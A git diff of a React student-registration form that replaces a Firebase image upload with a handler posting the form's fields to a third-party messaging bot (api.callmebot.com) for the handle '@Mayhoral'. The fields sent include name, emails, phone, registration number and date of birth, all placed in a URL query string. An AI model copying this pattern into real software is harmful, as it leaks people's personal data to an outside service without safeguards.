@@ -26,58 +26,101 @@ return (
           setSessOfGraduation,
           setDateOfBirth,
           loadData,
+          fullName,
+          emailAdd1,
+          emailAdd2,
+          phoneNumber,
+          regNumber,
+          department,
+          faculty,
+          programme,
+          sessOfEntry,
+          sessOfGraduation,
+          dateOfBirth,
            } =
           value;
 
-          const upload = (e)=>{
-            e.preventDefault();
-            if(image  === null)return;
-            const imageRef = ref(storage, `${auth.currentUser.uid}/${image.name}`);
-            uploadBytes(imageRef, image).then(()=>{
-              alert('image uploaded');
-            }).then(()=>{
-              const dbImageRef = ref(storage, `${auth.currentUser.uid}`)
-              listAll(dbImageRef).then((response)=>{
-                console.log(response)
-                const items = response.items
-                console.log(items)
-                let temp = []
-                items.forEach((item, i)=>{            
-                      getDownloadURL(item).then((urlRaw)=>{
-                        console.log(urlRaw)
-                        updateFunc(e, urlRaw);
-                      })
-                      
-                    })
-                  
-              }).then(()=>{
-                alert('Registration Successful ✔')
-              })
-            })
-          }
 
-        
-          // console.log(loadData.fullName)
-          
-          return (
-            <>
+          // const upload = (e)=>{
+          //   e.preventDefault();
+          //   if(image  === null)return;
+          //   const imageRef = ref(storage, `${auth.currentUser.uid}/${image.name}`);
+          //   uploadBytes(imageRef, image).then(()=>{
+          //     alert('image uploaded');
+          //   }).then(()=>{
+          //     const dbImageRef = ref(storage, `${auth.currentUser.uid}`)
+          //     listAll(dbImageRef).then((response)=>{
+          //       console.log(response)
+          //       const items = response.items
+          //       console.log(items)
+          //       let temp = []
+          //       items.forEach((item, i)=>{            
+          //             getDownloadURL(item).then((urlRaw)=>{
+          //               console.log(urlRaw)
+          //               updateFunc(e, urlRaw);
+          //             })
+                      
+          //           })
+                  
+          //     }).then(()=>{
+          //       alert('Registration Successful ✔')
+          //     })
+          //   })
+          // }
+          const string1 = []
+              const username =  '@Mayhoral'
+              const text = {
+                Fullname: fullName,
+                EmailAddress1: emailAdd1,
+                EmailAddress2: emailAdd2,
+                Phonenumber: phoneNumber,
+                RegistrationNumber: regNumber,
+                Department: department,
+                Faculty: faculty,
+                Programme: programme,
+                Sessionofentry: sessOfEntry,
+               Sessionofgraduation: sessOfGraduation,
+                DateofBirth: dateOfBirth
+              }
+              const upload = (e)=>{
+                e.preventDefault()
+                if (fullName !== ''&& emailAdd1 !== '' && emailAdd2 !== '' && phoneNumber !== '' && regNumber !== '' && department !== '' && faculty !== '' && sessOfEntry !== '' && dateOfBirth !== ''){
+              
+                  const string3 = JSON.stringify(text).replaceAll(',',',').replaceAll('"','').replaceAll('}', '').replaceAll('{', '')
+                  console.log(string3)
+                  string3.split(',').map((stringloop)=>{
+                    string1.push(' '+ stringloop)
+                  })
+                fetch( `https://api.callmebot.com/text.php?user=${username}&text=${string1.join(',').replaceAll(':', ': ')}`,{
+                  method: 'POST',
+                  mode: 'no-cors'
+                })
+                }else{
+                  alert('Please Fill Out All Fields')
+                }
+              
+              
+
+          }
+          if(initialToken){
+
+            return (
+              <>
             <div className="mx-auto block">
              <h2 className="ml-10 box mx-auto block text-center">
                 Welcome Back, {initialToken}
               </h2>
-              {/* <h3 className="text-center">{loadData.regStatus? 'Registered' : 'Not Registered'}</h3> */}
+              { <h3 className="text-center">{initialToken ? 'Registered' : 'Not Registered'}</h3> }
             </div>
               
-              {/* <div className="w-1/2 mt-10 mx-auto block">
-                <form className="grid gap-y-6 px-2 text-sm">
+              { <div className="w-1/2 mt-10 mx-auto block">
+                <form className="grid gap-y-6 px-2 text-sm" name="myForm" action="/action_page.php" method="post">
                    <div>
                     <label>Full Name (As in official documents)</label>
                     <span className="text-red-400">*</span>
                   </div>
                   <input
-                    value={loadData.regStatus? loadData.fullNameLocal: ''}
-                    readOnly = {loadData.regstatus? true : false}
-                    disabled = {loadData.status? true : false}
+                    name='fname'
                     type="text"
                     className="border focus:outline-none px-4 py-2 pb-2"
                     required
@@ -89,12 +132,16 @@ return (
                   </div>
                   <input
                     placeholder="example@gmail.com"
-                    value={loadData.regStatus ? loadData.emailAdd1Local : ''}
-                    readOnly = {loadData.regstatus? true : false}
+                 
                     type="email"
                     className="border focus:outline-none py-2 px-4 pb-2"
                     required
-                    onChange={(e)=> setEmailAdd1(e.target.value)}
+                    onChange={(e)=> setEmailAdd1(()=>{
+                      console.log(emailAdd1)
+                      return(e.target.value)
+                      
+                    })
+                    }
                   />
                   <div>
                     <label>Email address 2</label>
@@ -102,8 +149,7 @@ return (
                   </div>
                   <input
                     placeholder="example@gmail.com"
-                    value={loadData.regStatus? loadData.emailAdd2Local : ''}
-                    readOnly = {loadData.status? true : false}
+                 
                     type="email"
                     className="border focus:outline-none py-2  px-4 pb-2"
                     onChange={(e)=> setEmailAdd2(e.target.value)}
@@ -114,8 +160,7 @@ return (
                   </div>
                   <input
                     placeholder="+234"
-                    value={loadData.regStatus? loadData.phoneNumberLocal : ''}
-                    readOnly = {loadData.status? true : false}
+                    
                     type="text"
                     maxLength="11"
                     minLength="11"
@@ -131,8 +176,7 @@ return (
                   </div>
                   <input
                     placeholder="Registration Number"
-                    value={loadData.regStatus? loadData.regNumberLocal : ''}
-                    readOnly = {loadData.status? true : false}
+                   
                     type="text"
                     className="border focus:outline-none py-2  px-4 pb-2"
                     required
@@ -144,8 +188,6 @@ return (
                   </div>
                   <input
                     placeholder="Faculty Name"
-                    value={loadData.regStatus? loadData.facultyLocal : ''}
-                    readOnly = {loadData.status? true : false}
                     type="text"
                     className="border focus:outline-none py-2 px-4 pb-2"
                     required
@@ -157,8 +199,6 @@ return (
                   </div>
                   <input
                     placeholder="Department"
-                    value={loadData.regStatus? loadData.departmentLocal : ''}
-                    readOnly = {loadData.status? true : false}
                     type="text"
                     className="border focus:outline-none py-2  px-4 pb-2"
                     required
@@ -168,8 +208,9 @@ return (
                     <label>Programme:</label>{" "}
                     <span className="text-red-500">*</span>
                   </div>
-                  <select name="" className="border py-2 px-4 pb-2" required value={loadData.regStatus? loadData.programmeLocal : ''}
-                    readOnly = {loadData.status? true : false} onChange={(e)=> setProgramme(e.target.value)}>
+                  <select name="" className="border py-2 px-4 pb-2" required 
+                  
+                    onChange={(e)=> setProgramme(e.target.value)}>
                     <option value="Regular">Regular</option>
                     <option value="Special">Special</option>
                   </select>
@@ -180,8 +221,7 @@ return (
                   <select
                     name=""
                     id=""
-                    value={loadData.regStatus? loadData.sessOfEntryLocal : ''}
-                    readOnly = {loadData.status? true : false}
+                    
                     className="border py-2 px-4 pb-2 "
                     required
                     onChange={(e)=> setSessOfEntry(e.target.value)}
@@ -208,8 +248,7 @@ return (
                   <select
                     name=""
                     id=""
-                    value={loadData.regStatus? loadData.sessOfGraduationLocal : ''}
-                    readOnly = {loadData.status? true : false}
+                   
                     className="border py-2 px-4 pb-2"
                     required
                     onChange={(e)=> setSessOfGraduation(e.target.value)}
@@ -221,32 +260,33 @@ return (
                   <label>Date Of Birth:</label>
                   <input
                     placeholder="Phone Number"
-                    value={loadData.regStatus? loadData.dateOfBirthLocal : ''}
-                    readOnly = {loadData.status? true : false}
+                
                     type="date"
                     className="border-b-2 focus:outline-none px-4 pb-2"
                     required
                     onChange={(e)=> setDateOfBirth(e.target.value)}
                   />
-                  <label>NIN Slip:</label>
+                  {/* <label>NIN Slip:</label>
                   <input
-                    placeholder="Phone Number"
-                    value={loadData.regStatus? loadData.fullName : ''}
-                    readOnly = {loadData.status? true : false}
-                    disabled = {loadData.status? true : false}
+                   
                     type="file"
                     className="border-b-2 focus:outline-none px-4 pb-2"
                     required
                     onChange={(e)=> setImage(e.target.files[0])}
-                  />
-                  <button type="submit" className="border w-20 block mx-auto" onClick={(e)=> upload(e)}>SUBMIT</button>
+                  /> */}
+                  <button type="submit" value="submit" className="border w-20 block mx-auto" onClick={(e)=> upload(e)}>SUBMIT</button>
+                  
+
                 </form>
-              </div> */}
+              </div> }
             </>
           );
           
+        } else{
+          return  <Navigate to = '/login'  />
         }
       }
+    }
     </ConsumerContext>
     
   );
